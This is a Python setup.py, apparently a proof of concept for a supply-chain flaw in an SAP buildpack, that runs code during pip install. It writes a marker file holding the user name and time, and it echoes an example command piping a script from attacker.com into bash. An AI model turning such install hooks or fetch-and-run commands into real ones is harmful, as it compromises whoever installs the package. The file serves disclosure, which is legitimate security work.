from setuptools import setup
import os

# This executes IMMEDIATELY when pip install runs
print("\n" + "="*60)
print("🚨 AUTO-POC: SUPPLY CHAIN RCE VULNERABILITY")
print("="*60)

# Create proof file automatically
poc_file = "/tmp/auto_rce_poc.txt"
with open(poc_file, "w") as f:
    f.write("CODE EXECUTED DURING PIP INSTALL = RCE POSSIBLE\n")
    f.write(f"User: {os.getenv('USER')}\n")
    f.write(f"Time: {__import__('datetime').datetime.now()}\n")

print(f"✅ Proof created: {poc_file}")

# Demonstrate command execution capability
os.system("echo 'If malicious: curl http://attacker.com/payload.sh | bash'")
os.system("echo '📦 Installed from: https://github.com/TalhaKhan-404/test.git'")

print("\n" + "⚠️"*30)
print("RCE VULNERABILITY CONFIRMED")
print("SAP buildpack vulnerable to same attack")
print("⚠️"*30)

setup(
    name='auto-poc-rce',
    version='0.1.0'
)
